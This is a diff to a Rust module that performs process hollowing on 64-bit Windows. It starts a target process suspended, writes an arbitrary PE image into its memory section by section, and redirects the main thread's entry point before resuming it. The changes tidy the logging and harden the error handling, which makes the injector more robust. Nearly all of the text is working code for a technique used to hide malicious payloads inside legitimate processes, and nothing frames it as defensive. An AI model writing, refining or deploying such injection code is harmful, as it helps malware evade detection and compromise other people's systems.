@@ -1,5 +1,4 @@
-use anyhow::{anyhow, Result};
-use crate::debug_println;
+use anyhow::{anyhow, Context, Result};
 use std::mem;
 use windows::core::PCSTR;
 use windows::Win32::Foundation::{CloseHandle, HANDLE};
@@ -19,14 +18,14 @@ use windows::Win32::System::Threading::{
 /// Note: Currently only supports 64-bit PE binaries
 pub fn inject_and_execute(pe_data: &[u8], target_path: &str, verbose: bool) -> Result<()> {
     if verbose {
-        debug_println!("Starting Process Hollowing...");
+        println!("Starting Process Hollowing...");
     }
 
     validate_pe(pe_data, verbose)?;
     let is_64bit = is_pe64(pe_data)?;
 
     if verbose {
-        debug_println!(
+        println!(
             "Architecture: {}",
             if is_64bit { "64-bit" } else { "32-bit" }
         );
@@ -41,14 +40,14 @@ pub fn inject_and_execute(pe_data: &[u8], target_path: &str, verbose: bool) -> R
 
 fn hollow_process64(pe_data: &[u8], target_path: &str, verbose: bool) -> Result<()> {
     if verbose {
-        debug_println!("Creating suspended target process: {}", target_path);
+        println!("Creating suspended target process: {}", target_path);
     }
 
     // Create target process in suspended state
     let process_info = create_suspended_process(target_path)?;
 
     if verbose {
-        debug_println!("Process created with PID: {}", process_info.dwProcessId);
+        println!("Process created with PID: {}", process_info.dwProcessId);
     }
 
     // Get NT headers
@@ -59,9 +58,9 @@ fn hollow_process64(pe_data: &[u8], target_path: &str, verbose: bool) -> Result<
     let entry_point = unsafe { (*nt_header).OptionalHeader.AddressOfEntryPoint };
 
     if verbose {
-        debug_println!("Image base: 0x{:X}", image_base);
-        debug_println!("Image size: 0x{:X}", image_size);
-        debug_println!("Entry point: 0x{:X}", entry_point);
+        println!("Image base: 0x{:X}", image_base);
+        println!("Image size: 0x{:X}", image_size);
+        println!("Entry point: 0x{:X}", entry_point);
     }
 
     // Allocate memory in target process
@@ -84,7 +83,7 @@ fn hollow_process64(pe_data: &[u8], target_path: &str, verbose: bool) -> Result<
     }
 
     if verbose {
-        debug_println!("Allocated memory at: 0x{:X}", remote_base as u64);
+        println!("Allocated memory at: 0x{:X}", remote_base as u64);
     }
 
     // Write PE headers
@@ -95,41 +94,48 @@ fn hollow_process64(pe_data: &[u8], target_path: &str, verbose: bool) -> Result<
     context.ContextFlags = CONTEXT_FLAGS(0x10001F); // CONTEXT_FULL
 
     unsafe {
-        if GetThreadContext(process_info.hThread, &mut context).is_err() {
-            CloseHandle(process_info.hProcess)?;
-            CloseHandle(process_info.hThread)?;
-            return Err(anyhow!("Failed to get thread context"));
-        }
+        GetThreadContext(process_info.hThread, &mut context)
+            .map_err(|e| {
+                let _ = CloseHandle(process_info.hProcess);
+                let _ = CloseHandle(process_info.hThread);
+                anyhow::anyhow!("Failed to get thread context: {:?}", e)
+            })?;
     }
 
     // Update RCX (entry point for x64)
     context.Rcx = (remote_base as u64) + entry_point as u64;
 
     if verbose {
-        debug_println!("Setting entry point to: 0x{:X}", context.Rcx);
+        println!("Setting entry point to: 0x{:X}", context.Rcx);
     }
 
     unsafe {
-        if SetThreadContext(process_info.hThread, &context).is_err() {
-            CloseHandle(process_info.hProcess)?;
-            CloseHandle(process_info.hThread)?;
-            return Err(anyhow!("Failed to set thread context"));
-        }
+        SetThreadContext(process_info.hThread, &context)
+            .map_err(|e| {
+                let _ = CloseHandle(process_info.hProcess);
+                let _ = CloseHandle(process_info.hThread);
+                anyhow::anyhow!("Failed to set thread context: {:?}", e)
+            })?;
     }
 
     // Resume main thread
     if verbose {
-        debug_println!("Resuming main thread...");
+        println!("Resuming main thread...");
     }
 
     unsafe {
-        ResumeThread(process_info.hThread);
+        let resume_result = ResumeThread(process_info.hThread);
+        if resume_result == u32::MAX {
+            CloseHandle(process_info.hProcess)?;
+            CloseHandle(process_info.hThread)?;
+            return Err(anyhow!("Failed to resume thread"));
+        }
         CloseHandle(process_info.hProcess)?;
         CloseHandle(process_info.hThread)?;
     }
 
     if verbose {
-        debug_println!("Process hollowing completed successfully");
+        println!("Process hollowing completed successfully");
     }
 
     Ok(())
@@ -174,7 +180,7 @@ fn write_pe_to_process(
     let headers_size = unsafe { (*nt_header).OptionalHeader.SizeOfHeaders };
     
     if verbose {
-        debug_println!("Writing PE headers ({} bytes)...", headers_size);
+        println!("Writing PE headers ({} bytes)...", headers_size);
     }
 
     unsafe {
@@ -184,7 +190,8 @@ fn write_pe_to_process(
             pe_data.as_ptr() as *const std::ffi::c_void,
             headers_size as usize,
             None,
-        )?;
+        )
+        .context("Failed to write PE headers to target process")?;
     }
 
     // Write sections
@@ -199,13 +206,12 @@ fn write_pe_to_process(
             continue;
         }
 
-        let section_name = unsafe {
-            std::str::from_utf8_unchecked(&section.Name)
-                .trim_end_matches('\0')
-        };
+        let section_name = std::str::from_utf8(&section.Name)
+            .map_err(|_| anyhow!("Invalid UTF-8 in section name"))?
+            .trim_end_matches('\0');
 
         if verbose {
-            debug_println!(
+            println!(
                 "Writing section: {} (VirtualAddress: 0x{:X}, Size: 0x{:X})",
                 section_name,
                 section.VirtualAddress,
@@ -226,7 +232,8 @@ fn write_pe_to_process(
                 src,
                 section.SizeOfRawData as usize,
                 None,
-            )?;
+            )
+            .with_context(|| format!("Failed to write section {} to target process", section_name))?;
         }
     }
 
@@ -255,7 +262,7 @@ fn validate_pe(data: &[u8], verbose: bool) -> Result<()> {
     }
 
     if verbose {
-        debug_println!("PE validation passed");
+        println!("PE validation passed");
     }
 
     Ok(())
